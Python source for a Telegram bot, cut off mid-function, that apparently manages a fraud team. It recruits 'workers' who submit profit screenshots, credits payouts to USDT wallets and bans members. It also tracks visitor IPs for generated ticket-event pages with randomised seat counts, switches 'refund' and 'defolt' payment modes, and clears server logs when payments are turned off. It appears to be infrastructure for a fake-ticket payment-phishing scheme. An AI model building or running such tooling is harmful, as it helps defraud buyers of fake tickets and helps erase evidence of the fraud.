import logging
import asyncio
import sqlite3
import json
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, Router, types
from aiogram.filters import Command, Filter
from aiogram.types import (
    ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove
)
import os
import random
import string
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas
from reportlab.lib.units import mm
from reportlab.lib.utils import ImageReader
from PIL import Image
import barcode
from barcode.writer import ImageWriter
import uuid
from aiohttp import web
from functools import wraps
import aiohttp
from config import API_TOKEN, ADMIN_GROUP_ID, ADMIN_IDS, PAYMENT_GROUP_ID
import requests
from aiohttp.web_middlewares import middleware
import re
import time
import threading

from aiogram.filters import Filter

class StepFilter(Filter):
    def __init__(self, step_name):
        self.step_name = step_name
    async def __call__(self, message):
        uid = message.from_user.id
        step, _ = get_user_state(uid)
        return step == self.step_name

class StepStartsWithFilter(Filter):
    def __init__(self, prefix):
        self.prefix = prefix
    async def __call__(self, message):
        uid = message.from_user.id
        step, _ = get_user_state(uid)
        return step and step.startswith(self.prefix)

class StepIsNoneFilter(Filter):
    async def __call__(self, message):
        uid = message.from_user.id
        step, _ = get_user_state(uid)
        return step is None

# --- Logging setup ---
logging.basicConfig(
    filename='main.log',
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(funcName)s | %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

payment_type_by_uid = {}

def log_function(func):
    @wraps(func)
    async def wrapper(*args, **kwargs):
        logging.info(f'start | args={args} kwargs={kwargs}')
        try:
            result = await func(*args, **kwargs)
            logging.info(f'success | result={result}')
            return result
        except Exception as e:
            logging.error(f'error | Exception: {e}', exc_info=True)
            raise
    return wrapper

bot = Bot(token=API_TOKEN)
router = Router()
dp = Dispatcher()
dp.include_router(router)

# --- База данных ---
conn = sqlite3.connect('users.db', check_same_thread=False)
c = conn.cursor()
c.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    status TEXT,
    last_submit TEXT,
    username TEXT UNIQUE,
    source TEXT,
    invited_by TEXT,
    experience TEXT,
    screenshots TEXT,
    form_json TEXT,
    is_admin INTEGER DEFAULT 0
)
""")
conn.commit()
# Гарантируем, что главный админ есть
c.execute('INSERT OR IGNORE INTO users (user_id, is_admin) VALUES (?, 1)', (7973971109,))
c.execute('UPDATE users SET is_admin=1 WHERE user_id=?', (7973971109,))
conn.commit()
c.execute("""
CREATE TABLE IF NOT EXISTS event_links (
    event_code TEXT PRIMARY KEY,
    user_id INTEGER
)
""")
conn.commit()

# --- Таблица для пользователей сайта ---
c.execute("""
CREATE TABLE IF NOT EXISTS site_users (
    id VARCHAR(12) PRIMARY KEY,
    ip VARCHAR(45),
    date_1 VARCHAR(20),
    date_2 VARCHAR(20),
    date_3 VARCHAR(20),
    date_4 VARCHAR(20),
    date_5 VARCHAR(20),
    date_6 VARCHAR(20),
    date_7 VARCHAR(20),
    date_8 VARCHAR(20),
    currency VARCHAR(10),
    street TEXT,
    price DECIMAL(10,2),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    page_code TEXT UNIQUE
)
""")
conn.commit()

# Додаємо колонку page_code, якщо вона не існує
try:
    c.execute('SELECT page_code FROM site_users LIMIT 1')
except sqlite3.OperationalError:
    print("[DB] Adding page_code column to site_users table")
    c.execute('ALTER TABLE site_users ADD COLUMN page_code TEXT')
    c.execute('CREATE UNIQUE INDEX IF NOT EXISTS idx_page_code ON site_users(page_code)')
    conn.commit()
    print("[DB] page_code column added successfully")

# Заповнюємо page_code для існуючих записів, якщо потрібно
try:
    c.execute('SELECT COUNT(*) FROM site_users WHERE page_code IS NULL')
    null_count = c.fetchone()[0]
    if null_count > 0:
        print(f"[DB] Found {null_count} records without page_code, filling them...")
        # fill_page_codes()  # <-- Видалено, щоб не було помилки
        print("[DB] (fill_page_codes не викликається, бо не визначена)")
except Exception as e:
    print(f"[DB] Error checking/filling page_code: {e}")

def get_user(user_id):
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE user_id=?', (user_id,))
    row = c.fetchone()
    if row:
        return {
            'user_id': row[0],
            'status': row[1],
            'last_submit': row[2],
            'username': row[3],
            'source': row[4],
            'invited_by': row[5],
            'experience': row[6],
            'screenshots': json.loads(row[7]) if row[7] else [],
            'form_json': json.loads(row[8]) if row[8] else {},
            'is_admin': row[9] or 0
        }
    return None

# --- Функции для работы с site_users ---
def generate_site_user_id():
    """Генерирует уникальный ID для пользователя сайта"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_page_code():
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM site_users')
    total = c.fetchone()[0]
    series = total // 100 + 1
    number = total % 100 + 1
    return f"{series}-{number}"

def create_site_user(dates, currency, street, price):
    """Создает нового пользователя сайта с данными события, гарантуючи унікальний page_code"""
    c = conn.cursor()
    user_id = generate_site_user_id()
    # Збираємо всі зайняті page_code
    c.execute('SELECT page_code FROM site_users')
    busy_codes = set(row[0] for row in c.fetchall() if row[0])
    # Шукаємо перший вільний page_code
    max_attempts = 1000
    for attempt in range(1, max_attempts+1):
        series = (attempt - 1) // 100 + 1
        number = (attempt - 1) % 100 + 1
        page_code = f"{series}-{number}"
        if page_code in busy_codes:
            continue
        try:
            c.execute('''INSERT INTO site_users 
                         (id, date_1, date_2, date_3, date_4, date_5, date_6, date_7, date_8, currency, street, price, page_code) 
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                      (user_id, dates[0], dates[1], dates[2], dates[3], dates[4], dates[5], dates[6], dates[7], currency, street, price, page_code))
            conn.commit()
            # --- Додаємо початкову кількість квитків для кожної події ---
            for event_index in range(8):
                if event_index == 1:
                    places = 3
                else:
                    places = random.randint(1, 10)
                c.execute('INSERT OR REPLACE INTO event_places (page_code, event_index, places) VALUES (?, ?, ?)', (page_code, event_index, places))
            conn.commit()
            return user_id, page_code
        except sqlite3.IntegrityError as e:
            if 'UNIQUE constraint failed: site_users.page_code' in str(e):
                continue  # спробувати ще раз
            else:
                raise
    raise Exception('Не вдалося згенерувати унікальний page_code після 1000 спроб!')

def update_site_user_ip(user_id, ip):
    # Игнорируем IP Telegram
    if ip.startswith('149.154.') or ip.startswith('91.108.'):
        print(f"[DEBUG] Skip Telegram IP: {ip}")
        return
    
    print(f"[DEBUG] update_site_user_ip: user_id={user_id}, ip={ip}")
    c = conn.cursor()
    
    # Перевіряємо, чи існує запис з таким user_id
    c.execute('SELECT id, ip FROM site_users WHERE id=?', (user_id,))
    before = c.fetchone()
    
    if not before:
        print(f"[DEBUG] Site user with id={user_id} not found in site_users table")
        # Спробуємо знайти по IP
        c.execute('SELECT id, ip FROM site_users WHERE ip=? ORDER BY created_at DESC LIMIT 1', (ip,))
        ip_record = c.fetchone()
        if ip_record:
            print(f"[DEBUG] Found existing record with same IP: {ip_record}")
            return
        else:
            print(f"[DEBUG] No existing record found for IP {ip}, cannot update")
            return
    
    print(f"[DEBUG] BEFORE: {before}")
    c.execute('UPDATE site_users SET ip=? WHERE id=?', (ip, user_id))
    print(f"[DEBUG] update_site_user_ip: rowcount={c.rowcount}")
    c.execute('SELECT id, ip FROM site_users WHERE id=?', (user_id,))
    after = c.fetchone()
    print(f"[DEBUG] AFTER: {after}")
    conn.commit()

def get_site_user(user_id):
    """Получает данные пользователя сайта"""
    c = conn.cursor()
    c.execute('SELECT * FROM site_users WHERE id=?', (user_id,))
    row = c.fetchone()
    if row:
        return {
            'id': row[0],
            'ip': row[1],
            'dates': [row[2], row[3], row[4], row[5], row[6], row[7], row[8], row[9]],
            'currency': row[10],
            'street': row[11],
            'price': row[12],
            'created_at': row[13],
            'page_code': row[14]
        }
    return None

def save_user(user_id, status, username, source, invited_by, experience, screenshots, form_json):
    c = conn.cursor()
    now = datetime.utcnow().isoformat()
    c.execute('''INSERT OR REPLACE INTO users (user_id, status, last_submit, username, source, invited_by, experience, screenshots, form_json) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
              (user_id, status, now, username, source, invited_by, experience, json.dumps(screenshots), json.dumps(form_json)))
    conn.commit()

def update_user_status(user_id, status):
    c = conn.cursor()
    now = datetime.utcnow().isoformat()
    c.execute('UPDATE users SET status=?, last_submit=? WHERE user_id=?', (status, now, user_id))
    conn.commit()

def is_admin(user_id):
    db_user = get_user(user_id)
    return db_user and db_user.get('is_admin', 0) == 1

# --- In-memory шаги и временные данные ---
user_step = {}  # user_id: этап
user_data = {}  # user_id: временные данные анкеты и прочее

# --- Клавиатуры ---
source_kb = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="Реклама")], [KeyboardButton(text="От друга")]], resize_keyboard=True
)
skip_kb = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="Пропустить")]], resize_keyboard=True
)
main_menu_kb = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="⚙️Меню"), KeyboardButton(text="📎Ссылки")], [KeyboardButton(text="🎫Билеты")]], resize_keyboard=True
)
admin_menu_kb = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="⚙️Меню"), KeyboardButton(text="📎Ссылки")], [KeyboardButton(text="🎫Билеты")], [KeyboardButton(text="🛠️ Админ панель")]], resize_keyboard=True
)
profile_inline_kb = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text="Добавить/Изменить кошелек", callback_data="change_wallet")],
        [InlineKeyboardButton(text="Сменить псевдоним", callback_data="change_nickname")]
    ]
)
def admin_pay_kb(nickname):
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💸 Начислить баланс", callback_data=f"pay_add:{nickname}"),
             InlineKeyboardButton(text="❌ Снять баланс", callback_data=f"pay_sub:{nickname}")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="pay_back")]
        ]
    )
admin_panel_kb = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="🚫 Заблокировать / разблокировать")],
        [KeyboardButton(text="💸 Начислить выплату")],
        [KeyboardButton(text="Отключить платежку"), KeyboardButton(text="Включить платежку")],
        [KeyboardButton(text="Прямая оплата")],
        [KeyboardButton(text="⬅️ Назад")]
    ],
    resize_keyboard=True
)

def ban_guard(handler):
    @wraps(handler)
    async def wrapper(message, *args, **kwargs):
        uid = message.from_user.id
        db_user = get_user(uid)
        if db_user and db_user['form_json'].get('banned', False):
            await message.answer(
                "Вы заблокированы администратором. Причина: " + db_user['form_json'].get('ban_reason', 'Не указана')
            )
            return
        return await handler(message, *args, **kwargs)
    return wrapper

# --- Анкета ---
@router.message(Command("start"))
@ban_guard
async def cmd_start(message: types.Message):
    uid = message.from_user.id
    db_user = get_user(uid)
    if db_user:
        if db_user['status'] == 'pending':
            await message.answer("Ваша заявка уже отправлена, ожидайте проверки.")
            return
        elif db_user['status'] == 'approved':
            kb = admin_menu_kb if is_admin(uid) else main_menu_kb
            if message.chat.type == "private":
                await message.answer("Ваша заявка одобрена!\nДля продолжения работы используйте меню ниже:", reply_markup=kb)
            else:
                await message.answer("Ваша заявка одобрена!\nДля продолжения работы используйте меню ниже:", reply_markup=ReplyKeyboardRemove())
            return
        elif db_user['status'] == 'rejected':
            if db_user['last_submit']:
                last = datetime.fromisoformat(db_user['last_submit'])
                if datetime.utcnow() - last < timedelta(days=7):
                    next_time = last + timedelta(days=7)
                    await message.answer(f"Ваша заявка была отклонена. Повторно подать заявку можно {next_time.strftime('%d.%m.%Y %H:%M')}")
                    return
    set_user_state(uid, 'source', {})
    await message.answer("📢 Откуда о нас узнали?")
    await message.answer(" ", reply_markup=ReplyKeyboardRemove())

@router.message(StepFilter('source'))
@ban_guard
async def process_source(message: types.Message):
    uid = message.from_user.id
    step, data = get_user_state(uid)
    if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
        clear_user_state(uid)
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
        return
    if message.text not in ["Реклама", "От друга"]:
        await message.answer("📢 Откуда о нас узнали?", reply_markup=source_kb)
        return
    data['source'] = message.text
    if message.text == "От друга":
        set_user_state(uid, 'invited_by', data)
        await message.answer("👤 Кто пригласил? (tag или username)", reply_markup=ReplyKeyboardRemove())
    else:
        set_user_state(uid, 'experience', data)
        await message.answer("💼 Укажите опыт работы\n⏰ Сколько времени готовы уделять?", reply_markup=ReplyKeyboardRemove())

@router.message(StepFilter('invited_by'))
@ban_guard
async def process_invited_by(message: types.Message):
    uid = message.from_user.id
    step, data = get_user_state(uid)
    if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
        clear_user_state(uid)
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
        return
    data['invited_by'] = message.text
    set_user_state(uid, 'experience', data)
    await message.answer("💼 Укажите опыт работы\n⏰ Сколько времени готовы уделять?", reply_markup=ReplyKeyboardRemove())

@router.message(StepFilter('experience'))
@ban_guard
async def process_experience(message: types.Message):
    uid = message.from_user.id
    step, data = get_user_state(uid)
    if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
        clear_user_state(uid)
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
        return
    data['experience'] = message.text
    data['screenshots'] = []
    set_user_state(uid, 'screenshots', data)
    await message.answer("🖼 Отправьте скриншоты ваших профитов (до 3х)\nМожно пропустить", reply_markup=skip_kb)

@router.message(lambda m: m.text and m.text.strip().lower() == "пропустить")
@ban_guard
async def skip_screenshots(message: types.Message):
    uid = message.from_user.id
    step, data = get_user_state(uid)
    if step == 'screenshots':
        if 'screenshots' not in data:
            data['screenshots'] = []
        try:
            await finish_form(message)
        except Exception as e:
            print(f"[ERROR] finish_form failed: {e}")
    clear_user_state(uid)

@router.message(lambda m: m.content_type == types.ContentType.PHOTO)
@ban_guard
async def process_screenshots(message: types.Message):
    uid = message.from_user.id
    step, data = get_user_state(uid)
    if step != 'screenshots':
        return
    data.setdefault('screenshots', []).append(message.photo[-1].file_id)
    if len(data['screenshots']) >= 3:
        set_user_state(uid, 'screenshots', data)
        await finish_form(message)
    else:
        set_user_state(uid, 'screenshots', data)
        await message.answer(f"Скриншот {len(data['screenshots'])} принят. Можете отправить еще или нажмите 'Пропустить'.", reply_markup=skip_kb)

@router.message(StepFilter('screenshots'))
@ban_guard
async def process_other(message: types.Message):
    print(f"[DEBUG] process_other handler triggered for user {message.from_user.id}, text: {message.text}")
    uid = message.from_user.id
    step, data = get_user_state(uid)
    if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
        clear_user_state(uid)
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
        return
    if message.text and message.text.strip().lower() == "пропустить":
        return
    await message.answer("Пожалуйста, отправьте скриншот(ы) или нажмите 'Пропустить'.", reply_markup=skip_kb)

async def finish_form(message):
    uid = message.from_user.id
    step, data = get_user_state(uid)
    username = message.from_user.username or "-"
    print(f"[DEBUG] finish_form called for {uid}, data: {data}")
    source = data.get('source', '')
    invited_by = data.get('invited_by', '')
    experience = data.get('experience', '')
    screenshots = data.get('screenshots', [])
    text = f"Новая анкета!\n\nID: <code>{uid}</code>\nUsername: @{username}\nИсточник: {source}\n"
    if source == "От друга":
        text += f"Кто пригласил: {invited_by}\n"
    text += f"Опыт: {experience}\n"
    if screenshots:
        text += f"Скриншоты: {len(screenshots)} шт.\n"
    else:
        text += f"Скриншоты: не предоставлены\n"
    kb = InlineKeyboardMarkup(
        inline_keyboard=[[
            InlineKeyboardButton(text="Принять", callback_data=f"approve_{uid}"),
            InlineKeyboardButton(text="Отклонить", callback_data=f"reject_{uid}")
        ]]
    )
    try:
        print(f"[DEBUG] Sending message to ADMIN_GROUP_ID: {ADMIN_GROUP_ID}")
        await bot.send_message(ADMIN_GROUP_ID, text, parse_mode='HTML', reply_markup=kb)
        print(f"[DEBUG] Admin message sent successfully")
        for ph in screenshots:
            await bot.send_photo(ADMIN_GROUP_ID, ph)
            print(f"[DEBUG] Sending confirmation to user")
        await message.answer("Ваша анкета проверяется администрацией!\nОжидайте решение", reply_markup=ReplyKeyboardRemove())
        save_user(uid, 'pending', username, source, invited_by, experience, screenshots, data)
    except Exception as e:
        print(f"[ERROR] Sending to admin or user failed: {e}")
        import traceback
        traceback.print_exc()
    clear_user_state(uid)

@router.callback_query(lambda c: c.data.startswith('approve_') or c.data.startswith('reject_'))
async def process_decision(call: types.CallbackQuery):
    action, uid = call.data.split('_')
    uid = int(uid)
    if action == 'approve':
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        welcome_text = (
            "Ваша заявка одобрена!\n"
            "Чат: https://t.me/+hzNJ46_Vrc4wMzVk \n"
            "Канал оплат: https://t.me/+qAiX41DRpeA5MDc8 \n"
            "Для продолжения работы введите /start"
        )
        await bot.send_message(uid, welcome_text, reply_markup=kb)
        update_user_status(uid, 'approved')
    else:
        await bot.send_message(uid, "Ваша заявка отклонена.")
        update_user_status(uid, 'rejected')
    user_step.pop(uid, None)
    user_data.pop(uid, None)
    await call.message.edit_reply_markup(reply_markup=None)
    await call.answer()

# --- Меню и профиль ---
@router.message(lambda m: m.text == "⚙️Меню")
@ban_guard
async def show_profile(message: types.Message):
    uid = message.from_user.id
    db_user = get_user(uid)
    nickname = db_user['username'] or db_user['form_json'].get('username') or f"{uid}"
    join_date = db_user['last_submit'][:10] if db_user and db_user['last_submit'] else "-"
    if join_date != "-":
        join_date = datetime.fromisoformat(db_user['last_submit']).strftime('%d-%m-%Y')
    earned_total = db_user['form_json'].get('earned_total', 0) if db_user else 0
    earned_june = db_user['form_json'].get('earned_june', 0) if db_user else 0
    wallet = db_user['form_json'].get('wallet', None) if db_user else None
    wallet_str = wallet if wallet else '<b>Не установлен</b> <b>❗️</b>'
    text = (
        '«<b>Ваш профиль:</b>»\n'
        f'<b>Псевдоним:</b> <code>#{nickname}</code>\n'
        f'<b>Дата вступления:</b> <code>{join_date}</code>\n'
        '💰 <b>Заработано:</b>\n'
        f'├ <b>Всего:</b> <code>{earned_total}$</code>\n'
        f'└ <b>За июнь:</b> <code>{earned_june}$</code>\n'
        '💳 <b>USDT BEP-20 кошелек:</b>\n'
        f'└ {wallet_str}'
    )
    back_inline_kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_menu")]
        ]
    )
    await message.answer(text, reply_markup=profile_inline_kb, parse_mode='HTML')
    await message.answer("Повернутися в головне меню:", reply_markup=back_inline_kb)
    clear_user_state(uid)
    set_user_state(uid, 'menu', {})

@router.callback_query(lambda c: c.data == "back_to_menu")
async def back_to_menu_handler(call: types.CallbackQuery):
    uid = call.from_user.id
    clear_user_state(uid)
    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
    if call.message.chat.type == "private":
        await call.message.answer("Возврат в главное меню.", reply_markup=kb)
    else:
        await call.message.answer("Возврат в главное меню.")
    await call.answer()

@router.callback_query(lambda c: c.data == "change_nickname")
async def change_nickname_start(call: types.CallbackQuery):
    uid = call.from_user.id
    step, data = get_user_state(uid)
    set_user_state(uid, 'change_nickname', data)
    await call.message.answer("Введите новый псевдоним:")
    await call.answer()

@router.message(StepFilter('change_nickname'))
@ban_guard
async def change_nickname_save(message: types.Message):
    uid = message.from_user.id
    step, data = get_user_state(uid)
    if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
        clear_user_state(uid)
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
        return
    new_nick = message.text.strip()
    c = conn.cursor()
    c.execute('SELECT user_id FROM users WHERE username=?', (new_nick,))
    row = c.fetchone()
    if row and row[0] != uid:
        await message.answer("Данный псевдоним уже занят, выберите другой.")
        return
    c.execute('UPDATE users SET username=? WHERE user_id=?', (new_nick, uid))
    db_user = get_user(uid)
    form_json = db_user['form_json'] if db_user else {}
    form_json['username'] = new_nick
    c.execute('UPDATE users SET form_json=? WHERE user_id=?', (json.dumps(form_json), uid))
    conn.commit()
    clear_user_state(uid)
    await message.answer(f"Псевдоним изменён на: <b>{new_nick}</b>", parse_mode='HTML', reply_markup=main_menu_kb)

@router.callback_query(lambda c: c.data == "change_wallet")
async def change_wallet_start(call: types.CallbackQuery):
    uid = call.from_user.id
    step, data = get_user_state(uid)
    set_user_state(uid, 'change_wallet', data)
    await call.message.answer("Введите ваш USDT BEP-20 кошелек:")
    await call.answer()

@router.message(StepFilter('change_wallet'))
@ban_guard
async def change_wallet_save(message: types.Message):
    uid = message.from_user.id
    step, data = get_user_state(uid)
    if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
        clear_user_state(uid)
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
        return
    new_wallet = message.text.strip()
    db_user = get_user(uid)
    form_json = db_user['form_json'] if db_user else {}
    form_json['wallet'] = new_wallet
    c = conn.cursor()
    c.execute('UPDATE users SET form_json=? WHERE user_id=?', (json.dumps(form_json), uid))
    conn.commit()
    clear_user_state(uid)
    await message.answer(f"Кошелек сохранён: <code>{new_wallet}</code>", parse_mode='HTML', reply_markup=main_menu_kb)

# --- Админка ---
@router.message(lambda m: m.text and 'админ панель' in m.text.lower() and is_admin(m.from_user.id))
@ban_guard
async def admin_panel(message: types.Message):
    uid = message.from_user.id
    set_user_state(uid, 'admin_panel', {})
    await message.answer("Админ-панель. Выберите действие:", reply_markup=admin_panel_kb)

@router.message(StepFilter('admin_panel'))
@ban_guard
@log_function
async def admin_panel_action(message: types.Message):
    uid = message.from_user.id
    step, data = get_user_state(uid)
    if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
        clear_user_state(uid)
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
        return
    if message.text == "⬅️ Назад":
        kb = admin_menu_kb
        await message.answer("Возврат в главное меню.", reply_markup=kb)
        clear_user_state(uid)
        return
    elif message.text == "🚫 Заблокировать / разблокировать":
        set_user_state(uid, 'ban_unban_user', data)
        await message.answer("Введите username пользователя для блокировки/разблокировки (без @):", reply_markup=ReplyKeyboardRemove())
    elif message.text == "💸 Начислить выплату":
        set_user_state(uid, 'pay_user', data)
        kb = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="payuser_back")]
            ]
        )
        await message.answer("Введите псевдоним пользователя:", reply_markup=kb)
    elif message.text == "Отключить платежку":
        # Вимкнути платіжку через сервер
        import requests
        try:
            requests.get('http://127.0.0.1:8080/set_payment_disabled?value=1', timeout=2)
            # Очищення логів через серверний endpoint
            requests.get('http://127.0.0.1:8080/clear_logs', timeout=2)
        except Exception as e:
            print(f"[admin_panel] Error disabling payment: {e}")
        await message.answer("Платёжка временно отключена для всех пользователей.")
    elif message.text == "Включить платежку":
        # Увімкнути платіжку через сервер
        import requests
        try:
            requests.get('http://127.0.0.1:8080/set_payment_disabled?value=0', timeout=2)
        except Exception as e:
            print(f"[admin_panel] Error enabling payment: {e}")
        await message.answer("Платежка включена для всех пользователей.")
    elif message.text == "Прямая оплата":
        payment_kb = ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="refund"), KeyboardButton(text="defolt")],
                [KeyboardButton(text="⬅️ Назад")]
            ],
            resize_keyboard=True
        )
        user_step[message.from_user.id] = 'payment_type_selection'
        await message.answer("Выберите тип оплаты:", reply_markup=payment_kb)
    else:
        pass  # Відповідь на невідому команду тепер тільки у fallback-хендлері

@router.callback_query(lambda c: c.data == "payuser_back")
async def payuser_back_handler(call: types.CallbackQuery):
    uid = call.from_user.id
    user_step[uid] = None
    manual_payment_attempts.pop(uid, None)
    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
    await call.answer()

# --- Выплаты ---
@router.message(lambda m: user_step.get(m.from_user.id) == 'pay_user')
@ban_guard
async def admin_pay_user_profile(message: types.Message):
    uid = message.from_user.id
    step, data = get_user_state(uid)
    if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
        clear_user_state(uid)
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
        return
    nickname = message.text.strip().lstrip('@')
    c = conn.cursor()
    c.execute('SELECT user_id FROM users WHERE LOWER(username)=?', (nickname.lower(),))
    row = c.fetchone()
    if not row:
        await message.answer("Пользователь с таким псевдонимом не найден. Введите корректный псевдоним ещё раз:")
        return
    target_id = row[0]
    db_user = get_user(target_id)
    if not db_user:
        await message.answer("Ошибка получения профиля пользователя. Попробуйте позже.")
        return
    nick = db_user.get('username') or db_user['form_json'].get('username') or target_id
    join_date = db_user['last_submit'][:10] if db_user.get('last_submit') else "-"
    if join_date != "-":
        try:
            join_date = datetime.fromisoformat(db_user['last_submit']).strftime('%d-%m-%Y')
        except Exception:
            pass
    earned_total = db_user['form_json'].get('earned_total', 0)
    earned_june = db_user['form_json'].get('earned_june', 0)
    wallet = db_user['form_json'].get('wallet', None)
    wallet_str = wallet if wallet else '<b>Не установлен</b> <b>❗️</b>'
    text = (
        '«<b>Ваш профиль:</b>»\n'
        f'<b>Псевдоним:</b> <code>#{nick}</code>\n'
        f'<b>Дата вступления:</b> <code>{join_date}</code>\n'
        '💰 <b>Заработано:</b>\n'
        f'├ <b>Всего:</b> <code>{earned_total}$</code>\n'
        f'└ <b>За июнь:</b> <code>{earned_june}$</code>\n'
        '💳 <b>USDT BEP-20 кошелек:</b>\n└ {wallet_str}'
    )
    data['pay_target'] = target_id
    data['pay_username'] = nick
    set_user_state(uid, 'pay_user_profile', data)
    await message.answer(text, parse_mode='HTML', reply_markup=admin_pay_kb(nick))

@router.callback_query(lambda c: c.data.startswith('pay_add:') or c.data.startswith('pay_sub:'))
async def admin_pay_action(call: types.CallbackQuery):
    uid = call.from_user.id
    data = call.data
    if data.startswith('pay_add:'):
        action = 'pay_add'
        nickname = data.split(':', 1)[1]
    else:
        action = 'pay_sub'
        nickname = data.split(':', 1)[1]
    user_data[uid]['pay_action'] = action
    user_data[uid]['pay_username'] = nickname
    user_step[uid] = 'pay_amount'
    await call.message.answer("Введите сумму:")
    await call.answer()

@router.message(lambda m: user_step.get(m.from_user.id) == 'pay_amount')
@ban_guard
async def admin_pay_amount(message: types.Message):
    if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
        uid = message.from_user.id
        user_step[uid] = None
        user_data[uid] = {}
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
        return
    uid = message.from_user.id
    try:
        amount = float(message.text.strip().replace(',', '.'))
    except Exception:
        await message.answer("Введите сумму числом!")
        return
    action = user_data[uid].get('pay_action')
    username = user_data[uid].get('pay_username')
    c = conn.cursor()
    c.execute('SELECT user_id, username, form_json FROM users')
    found = None
    for row in c.fetchall():
        user_id, db_username, form_json = row
        form_json = json.loads(form_json) if form_json else {}
        nick = db_username or form_json.get('username')
        if (db_username and db_username.lower() == username.lower()) or (nick and nick.lower() == username.lower()):
            found = (user_id, db_username, form_json)
            break
    if not found:
        await message.answer("Пользователь не найден.")
        user_step[uid] = None
        return
    target_id, db_username, form_json = found
    if action == 'pay_add':
        form_json['earned_total'] = form_json.get('earned_total', 0) + amount
        await message.answer(f"Пользователю @{username} начислено {amount}$.")
    else:
        form_json['earned_total'] = max(0, form_json.get('earned_total', 0) - amount)
        await message.answer(f"С пользователя @{username} снято {amount}$.")
    c.execute('UPDATE users SET form_json=? WHERE user_id=?', (json.dumps(form_json), target_id))
    conn.commit()
    # Показываем профиль снова
    earned_total = form_json.get('earned_total', 0)
    earned_june = form_json.get('earned_june', 0)
    wallet = form_json.get('wallet', None)
    wallet_str = wallet if wallet else '<b>Не установлен</b> <b>❗️</b>'
    nick = db_username or form_json.get('username') or target_id
    text = (
        f'Профиль пользователя <b>@{nick}</b>\n'
        f'💰 <b>Заработано:</b>\n'
        f'├ <b>Всего:</b> <code>{earned_total}$</code>\n'
        f'└ <b>За июнь:</b> <code>{earned_june}$</code>\n'
        f'💳 <b>USDT BEP-20 кошелек:</b>\n└ {wallet_str}'
    )
    await message.answer(text, parse_mode='HTML', reply_markup=admin_pay_kb(nick))
    user_step[uid] = None

@router.callback_query(lambda c: c.data == "pay_back")
async def pay_back_handler(call: types.CallbackQuery):
    uid = call.from_user.id
    user_step[uid] = None
    manual_payment_attempts.pop(uid, None)
    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
    await call.answer()

# --- Блокировка/разблокировка пользователей ---
@router.message(lambda m: user_step.get(m.from_user.id) == 'ban_unban_user')
@ban_guard
async def ban_unban_username(message: types.Message):
    uid = message.from_user.id
    back_inline_kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_menu")]
        ]
    )
    await message.answer("Введите username пользователя для блокировки/разблокировки (без @):", reply_markup=back_inline_kb)
    user_step[uid] = 'ban_unban_user'

@router.callback_query(lambda c: c.data.startswith('ban:'))
async def ban_reason_ask(call: types.CallbackQuery):
    uid = call.from_user.id
